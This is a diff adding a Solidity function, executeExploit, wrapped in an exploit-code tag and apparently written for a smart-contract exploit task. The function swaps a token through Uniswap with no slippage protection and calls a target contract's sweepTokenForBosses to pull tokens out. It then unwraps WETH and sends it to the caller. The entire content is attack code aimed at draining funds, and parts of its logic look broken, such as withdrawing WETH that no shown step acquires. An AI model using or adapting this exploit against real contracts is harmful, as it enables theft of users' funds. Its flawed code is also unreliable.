@@ -1,0 +1,32 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // 1. Approve the valuableToken transfer
+    valuableToken.approve(address(uniswapRouter), amount);
+    
+    // 2. Swap valuableToken for SecondToken
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(token);
+
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount, 
+        0, // Accept any amount of tokens
+        path, 
+        address(this), 
+        block.timestamp
+    );
+
+    // 3. Obtain the amount of SecondToken received
+    uint256 tokenAmount = IERC20(token).balanceOf(address(this));
+
+    // 4. Call the function to sweep the tokens for the boss (assuming the target contract is set up correctly)
+    ISecondToken(target).sweepTokenForBosses(tokenAmount);
+
+    // 5. Transfer any WETH (or equivalent) back to the original caller 
+    uint256 wethAmount = IWETH(uniswapRouter.WETH()).balanceOf(address(this));
+    IWETH(uniswapRouter.WETH()).withdraw(wethAmount);
+    payable(msg.sender).transfer(wethAmount);
+}
+</executeExploitCode>
+```
